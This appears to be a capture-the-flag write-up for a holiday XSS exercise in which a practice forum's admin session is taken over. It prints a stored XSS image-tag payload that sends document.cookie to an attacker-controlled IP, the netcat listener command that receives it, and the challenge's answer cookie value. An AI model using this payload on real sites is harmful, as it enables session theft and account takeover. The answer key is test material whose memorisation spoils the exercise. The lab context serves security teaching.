# [Day 18] ELF JS

## Description
McSkidy knows the crisis isn't over. The best thing to do at this point is OSINT

we need to learn more about the christmas monster

During their OSINT, they came across a Hacker Forum. Their research has shown them that this forum belongs to the Christmas Monster. Can they gain access to the admin section of the forum? They haven't made an account yet so make sure to register.

Access the machine at http://[your-ip-address]:3000 - it may take a few minutes to deploy.

Check out the supporting material here.

P.S. If you want to learn more about XSS, we have a room where you can learn about it in depth.

----

## Answer the questions below

Add a netcat listener and post the following payload
```
payload: <img src=x onerror=this.src='http://YOUR_IP:4444/?'+document.cookie;>


netcat: nc -lvnp 4444 
```

### What is the admin's authid cookie value?
Answer: `2564799a4e6689972f6d9e1c7b406f87065cbf65`
